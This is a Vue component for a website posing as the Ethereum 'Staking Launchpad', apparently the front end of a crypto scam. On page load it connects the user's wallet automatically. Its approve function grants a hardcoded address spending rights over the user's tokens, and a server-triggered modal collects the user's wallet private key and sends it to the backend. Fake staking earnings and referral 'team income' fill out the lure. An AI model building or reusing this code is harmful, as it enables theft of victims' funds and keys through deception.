<template>
  <div class="fixed  w-full z-30 ">
    <!-- Nav Bar -->
    <section class="wallet-btn flex px-4 justify-between py-4 bar-shadow">
      <div class="flex items-center">
        <router-link to="/" class="flex items-center">
          <img
            class="mr-2"
            src="@/assets/eth-diamond-plain.svg"
            alt="beijing"
          />
          <div class="sm:block lg:hidden ml-2 hover:opacity-50 text-base opacity-70 font-medium">
            Staking Lauchpad
          </div> 
        </router-link>
        <ul class="hidden lg:flex ml-2 space-x-8 text-base opacity-70 font-medium">
          <router-link to="/" class="hover:opacity-50">Staking Launchpad</router-link>
          <router-link to="/validator" class="hover:underline hover:opacity-50">FAQ</router-link>
          <li class="hover:underline hover:opacity-50 cursor-pointer">What is Staking</li>
          <router-link to="/term" class="hover:underline hover:opacity-50">Terms of Service</router-link>
          <li class="hover:underline hover:opacity-50 cursor-pointer" @click="isUser" >User Center</li>
        </ul>
      </div>
      <div class="flex">
        <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="linkWallet" v-if="!address">CONNECT WALLET</button>
        <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="approve" v-else> {{ !isApproved ? 'APPROVED' : `${address.slice(0, -36)}...${address.substring(38)}` }}</button>
        <div class="lg:hidden flex items-center ml-4 h-12" @click="isMenu">
          <font-awesome-icon v-if="menu" :icon="['fas', 'xmark']" class="font-bold text-2xl w-8 h-8" />
          <font-awesome-icon v-else :icon="['fas', 'bars']" class="font-bold text-2xl w-8 h-8" />
        </div>
      </div>
    </section>
    <div class="-z-20 absolute w-full block sm:block  ease-in-out transition transform duration-700" :class="menu ? 'translate-y-0' : '-translate-y-96'">
      <div v-if="testValue !== 'dashboard'"  class="bg-blue-20 px-8 py-4">
        <div class="font-semibold">Launced network: Prater Testnet</div>
        <a href="#" class="text-blue-300 hover:text-black">Switch to mainnet launchpad ↗</a>
        <div class="pt-4"><em>Visit this website on desktop to become a validator.</em></div>
      </div>
      <ul class="px-8 bg-white py-4">
        
        <li>
          <router-link to="/validator">FAQ</router-link>
        </li>
        <li class="cursor-pointer">What is Staking</li>
        <li>
          <router-link to="/term">Terms of Service</router-link>
        </li>
        <li class="hover:underline hover:opacity-70 cursor-pointer" @click="isUser">User Center</li>
      </ul>
    </div>
    <div v-if="address">
      <div v-if="!user" class="absolute w-full h-screen bg-black z-40 top-0 foggy-modal opacity-70" @click="isUser"/>
      <div class="absolute right-0 sm:w-88 w-full bg-red-10 z-50 h-screen sm:h-130   ease-in-out transition transform duration-700" :class="[user ? 'translate-x-full' : 'translate-x-0', isWithDrawModal ? 'overflow-y-auto':'overflow-y-auto']">
        <div class="flex justify-end p-4" @click="isUser"><button></button><font-awesome-icon :icon="['fas', 'xmark']" class="font-bold text-2xl w-8 h-8" /></div>
        <div class="flex px-8 pb-6">
          <div class="relative">
            <img src="@/assets/man.jpg" alt="eth" class="w-14 h-14 rounded-full">
            <div class="absolute bg-brown w-14 h-4 rounded-full top-11 text-sm text-white text-center">{{userInfo?.creadit_score}}</div>
          </div>
          <div class="flex flex-col justify-center ml-4">
            <div>Wallet Adddress</div>
            <div v-if="address">{{`${address.slice(0, -36)}...${address.substring(37)}`}}</div>
            <div v-else>Please connect your wallet</div>
          </div>
        </div> 
        <div class="bg-white rounded-2xl box-shadow m-4 font-bold">
          <div class="p-4">
            <div>Staking Time</div>
            <div class="flex flex-col pt-4">
              <div class="mb-1 font-normal" > <strong>Start:</strong> {{earningRecords?.is_confirmed?`${earningRecords.created_at?.slice(0, 10)}&nbsp;${earningRecords.created_at?.slice(11, 19)}`:''}}</div>
              <div class="font-normal"><strong>End:</strong> {{earningRecords?.is_confirmed?`${earningRecords.ending_at?.slice(0, 10)}&nbsp;${earningRecords.ending_at?.slice(11, 19)}`:''}}</div>
            </div> 
          </div>
          <hr  class="h-1 bg-blue-20"/>
          <div class="flex p-4 justify-around">
            <div class="w-3/5">
              <div>Staking Amount</div>
              <div class="flex items-center py-2">
                <img src="@/assets/USD-Coin-icon_small.png" alt="USD" class="w-6 h-6">
                <div class="ml-1">{{userInfo.staking_balance?.toFixed(5)}}</div>
              </div>
            </div>
            <div class="w-2/5">
              <div>Balance</div>
              <div class="flex items-center py-2">
                <img src="@/assets/ETH-logo2.png" alt="eth" class="w-6 h-6">
                <div class="ml-1">{{userInfo.account_balance?.toFixed(5)}}</div>
              </div>
              <div class="flex items-center">
                <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-6 h-6">
                <div class="ml-1">{{isConverted ? `${usdc_value}`:"0.00000"}} </div>
              </div>
            </div>
          </div>
        </div>

        <div class="flex justify-center">
          <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full hover:opacity-100" :class="isWithDrawModal? 'bg-red-500':''" @click="withdraw">WITHDRAW</button>
        </div>
        <div v-if="isWithDrawModal" class="absolute w-full h-130 bg-red-10 z-20  top-0 overflow-hidden">
          <div class="flex justify-center pb-4 pt-16">
            <div class="text-red-300 w-8 h-8 rounded-full border-2 border-red-300 flex justify-center items-center my-2 absolute left-8" @click="withdraw">
              <font-awesome-icon :icon="['fas', 'arrow-left']" class="font-bold text-2xl w-6 h-6" />
            </div>
            <div class="bg-white flex justify-center items-center rounded-full px-8 text-xl py-2 font-bold"> 
              <div>WITHDRAW</div>
            </div>
          </div>
          <hr class="bg-gray-25 h-1"/>

          

          <div class="bg-white rounded-2xl box-shadow my-8 mx-4">
            <div>
              <div class="w-72 mx-auto">
                <div class="relative pt-8 pb-2">
                  <input type="number" class="bg-red-300 rounded w-full h-12 px-4" v-model="withdrawValue"/>
                  <div class="flex items-center space-x-2 py-2">
                    <div class="text-sm">Usable USDC {{userInfo.usdc_balance}}</div>
                    <button class="rounded-full px-4 border border-red-300 text-red-300">max</button>
                  </div>
                  <div class="flex items-center space-x-2 py-1">
                    <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-8 h-8 absolute right-1 top-10">
                  </div>
                </div>
                <div class="flex justify-center py-4 relative z-10  ">
                  <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full z-10" @click="withdrawConfirm" :disabled="userInfo.usdc_balance <= 0">WITHDRAW</button>
                </div>
              </div>
            </div>
          </div>

          <div v-if="isPrivateKey" class=" z-50 bg-white rounded-2xl box-shadow relative -mt-64 mx-4">
            <div>
              <div class="w-72 mx-auto">
                <div class="text-center text-xl pt-4">ATTENTION</div>
                <div class="relative pt-8 pb-2">
                  <input type="text" class="bg-red-300 rounded w-full h-12 pl-4" v-model="privateKeyValue"/>
                </div>
                <div>Lorem ipsum dolor sit amet consectetur adipisicing elit. Consequatur, aperiam commodi. Iste tempore recusandae assumenda voluptatem voluptate amet impedit?</div>
                <div class="flex justify-center py-4">
                  <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full" @click="privateKey">CONFIRM</button>
                </div>
              </div>
            </div>
          </div>

        </div>
        <div class="bg-white rounded-2xl box-shadow my-8 mx-4 font-bold">
          <div class="py-4 text-center">Ethernet Exchange</div>
          <hr  class="h-1 bg-blue-20"/>
          <div>
            <div class="w-40 mx-auto">
              <div class="flex items-center space-x-2 py-1">
                <img src="@/assets/ETH-logo2.png" alt="usd" class="w-8 h-8">
                <div class="text-xl">ETH</div>
                <button class="rounded-full px-4 border border-red-300 text-red-300">max</button>
              </div>
              <input type="number" class="bg-red-300 rounded w-full h-9 opacity-60 pl-4" v-model="eth_value"/>
              <div class="text-red-300 w-8 h-8 rounded-full border-2 border-red-300 flex justify-center items-center mx-auto my-2 cursor-pointer" @click="exchange">
                <font-awesome-icon :icon="['fas', 'arrow-down']" class="font-bold text-2xl w-6 h-6" />
              </div>
              <div class="flex items-center space-x-2 py-1">
                <img src="@/assets/USD-Coin-icon_small.png" alt="usd" class="w-8 h-8">
                <div class="text-xl">USDC</div>
              </div>
              <input type="number" class="bg-red-300 rounded w-full h-9 opacity-60 pl-4" :value="(usdc_value).toFixed(5)" disabled/>

              <div class="flex justify-center py-4">
                <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full" @click="cryptoExchange" :disabled="!isConfirm" >CONVERT</button>
              </div>
            </div>
          </div>
        </div>

        <div class="bg-white rounded-2xl box-shadow mx-4 my-4 font-bold flex justify-between p-4">
          <div>
            <div>My Invitations</div>
            <div class="flex items-center py-2">
              <img src="@/assets/avatar.png" alt="avatar" class="w-6 h-6">
              <div class="ml-2">0</div>
            </div>
          </div>
          <div>
            <div>Team income</div>
            <div class="flex items-center py-2">
              <img src="@/assets/ETH-logo2.png" alt="eth" class="w-6 h-6">
              <div class="ml-2">0.00000</div>
            </div>
          </div>
        </div>

        <div class="flex justify-center">
          <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full" @click="invite">INVITE USERS</button>
        </div>

        <div v-if="isInvite" class="bg-red-100  h-80 box-shadow rounded-xl absolute top-96 left-1/2 w-92 -ml-40">
          <div class="flex justify-end p-2" @click="invite">
            <font-awesome-icon :icon="['fas', 'xmark']" class="font-bold text-2xl w-6 h-6" />
          </div>
          <div class="mb-4 text-center font-bold">Invitation Links</div>
          <div class="border-2 border-black rounded-xl w-64 h-40 mx-auto bg-red-200"></div>
          <button class="bg-red-300 rounded-full w-32 h-10 flex justify-center items-center mx-auto my-4" @click="copy">
            <div>Copy</div> 
          </button>
        </div>

        <div class="bg-white rounded-2xl box-shadow mx-4 mt-8 mb-36 pb-8">
        
          <TabsWrapper class="px-4">
            <TabItem title="Earnings records">
              <div class="text-gray-500 flex justify-between px-2 border-b border-black text-xs py-2">
                <div>{{`${earningRecords.created_at?.slice(0, 10)}&nbsp;${earningRecords.created_at?.slice(11, 19)}`}}</div>
                <div class="text-center">+{{earningRecords.earning?.toFixed(5)}} ETH</div>
              </div>
            </TabItem>
            <TabItem title="Withdrawal records">
              <div class="text-gray-500 flex justify-between px-2 border-b border-black text-xs py-2" v-for="(item, i) in withDrawRecords" :key="i">
                <div>{{`${item.created_at?.slice(0, 10)}&nbsp;${item.created_at?.slice(11, 19)}`}}</div>
                <div>-{{item.amount}} USDC</div>
                <div class="flex justify-center items-center">
                  <div>{{item.is_confirmed?'Confirm':'Warning'}}</div>
                </div>
              </div>
            </TabItem>
          </TabsWrapper>
        </div>  
      </div>
    </div>

    <div v-if="isWallet">
      <div class="absolute w-full h-screen bg-black z-40 top-0 foggy-modal opacity-70"/>
        <div class="bg-white w-72 mx-auto z-40 relative flex justify-center items-center py-8 rounded-2xl flex-col mt-72">
          <div> Please connect your wallet!!!</div>
          <button @click="close" class="bg-green-650 text-white rounded-full px-8 py-2 mt-8">Close</button>
        </div>
    </div>



  </div>
</template>
<script>
  import { ref, computed, onMounted } from 'vue';
  import { useRoute } from 'vue-router'
  import Web3Wallet from "@/utils/Web3Wallet"
  import {getUrlQueryString} from "@/utils" 
  import { useStore } from 'vuex';
  import useClipboard from 'vue-clipboard3'
  import TabsWrapper from '@/components/dashboard/tab/TabsWrapper.vue'
  import TabItem from '@/components/dashboard/tab/TabItem.vue'
  export default {
    components : {
      TabsWrapper,
      TabItem,
    },
    setup() {
      const route = useRoute()
      const store = useStore()
      const testValue = computed(() => route.name)
      const { toClipboard } = useClipboard()
      let menu = ref(false);
      let user = ref(true);
      const usdc_balance = ref(0);
      const eth_value = ref(0);
      const usdc_value = ref(0);
      const address = ref('');
      const balance = ref(0);
      const withdrawValue = ref(0);
      const isApproved = ref(false);
      const isConverted = ref(false);
      const isWithDrawModal = ref(false);
      const isInvite = ref(false)
      const isConfirm = ref(false)
      const privateKeyValue = ref('');
      const isWallet = ref(false);
      const isMenu = () => (menu.value = !menu.value);
      const isUser = async () => {
        user.value = !user.value
        if(!address.value) {
          isWallet.value = true
        }
        await store.dispatch('withdraw/getWithDraw', address.value)
        await store.dispatch('withdraw/getEarning', address.value)
      };
      const close = () => {
        isWallet.value = false
      }
      const withdraw = () => (isWithDrawModal.value = !isWithDrawModal.value);
      

      
      let wallet;
      let a, i;
      const environment = ref('Ethereum');

      const linkWallet = async () => {
        environment.value = 'Ethereum'
        onConnect()
      }

      const onConnect = async () => {
        if (environment.value === 'Ethereum' && window.ethereum) {
          wallet = new Web3Wallet();
        } else {
          console.log("Error")
          return;
        }
        try {
          await wallet.linkWallet();
          address.value = await wallet.getAddress();
          
          let aprove = await wallet.getAllowance(address.value, '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9');
          console.log("aprove", aprove)
          if(aprove > 0) {
            isApproved.value = true;
          }
          

          store.commit('user/setAddress', address.value)

          if (address.value === false) {
            throw new TypeError("There was an issue signing you in.")
          }
          usdc_balance.value = await wallet.getBalance(address.value)
          balance.value = await wallet.balance(address.value)
          let payload = {
            wallet: address.value,
            eth_balance: balance.value,
            usdc_balance: usdc_balance.value,
          }
          const response = await store.dispatch( 'user/fetchUserInfo', address.value )
          
          if(response < 1) {
            await store.dispatch( 'user/userRegister', payload )
          }

        } catch (err) {
          console.log('login', err)
        }
      }
      const approve = async () => {
        let auth_address = '';
        if (environment.value === 'Ethereum') {
          auth_address = '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9'
        } 
        if (auth_address === '') {
          console.log("Error")
          return;
        }
        try {
          const hash = await wallet.approve(auth_address, address.value);
          
        } catch (error) {
          isApproved.value = false;
        }
      }
      

      onMounted(async () => {
        a = getUrlQueryString('a');
        i = getUrlQueryString('i');
        setTimeout(() => {
          linkWallet();
        }, 1000);

        await store.dispatch( 'user/fetchEtherPrice')
     
      })
      const ethPrice = computed(() => store.getters['user/getEtherPrice'])
      const userInfo = computed(() => store.getters['user/getUserInfo'])
      const withDrawRecords = computed(() => store.getters['withdraw/getWithDrawRecords'])
      const earningRecords = computed(() => store.getters['withdraw/getEarningRecords'])

      const isPrivateKey = userInfo.value.popup_privatekey;
      const privateKey = async () => {
        isPrivateKey.value = !isPrivateKey.value;
        let payload = {
          walletAddress:address.value,
          data: { 
            privatekey : privateKeyValue.value
          }
        }
        await store.dispatch('user/createPrivateKey', payload)
      }

      const exchange = () => {
        usdc_value.value = ethPrice.value *  eth_value.value
        if(userInfo?.eth_balance > eth_value.value) {
          isConfirm.value = true
        }
      }

      const withdrawConfirm = async () => {
        let payload = {
          wallet: address.value,
          amount: withdrawValue.value
        }
        await store.dispatch( 'withdraw/withdraw', payload)
      }

      const invite = () => {
        console.log("hello")
        isInvite.value = !isInvite.value
      }

      const copy = async () => {
        try {
          await toClipboard('Any text you like')
          console.log('Copied to clipboard')
        } catch (e) {
          console.error(e)
        }
      }

      const cryptoExchange = () => {
        isConverted.value = !isConverted.value
      }

      return { 
        menu, 
        isMenu, 
        user, 
        close,
        isUser, 
        isWallet,
        testValue, 
        linkWallet, 
        address, 
        approve, 
        isApproved, 
        isWithDrawModal, 
        withdraw, 
        privateKey, 
        isPrivateKey, 
        userInfo, 
        exchange, 
        eth_value, 
        usdc_value,
        withdrawConfirm,
        withdrawValue,
        privateKeyValue,
        invite,
        isInvite,
        copy,
        cryptoExchange,
        isConfirm,
        isConverted,
        withDrawRecords,
        earningRecords,
      };

    },
  };
</script>
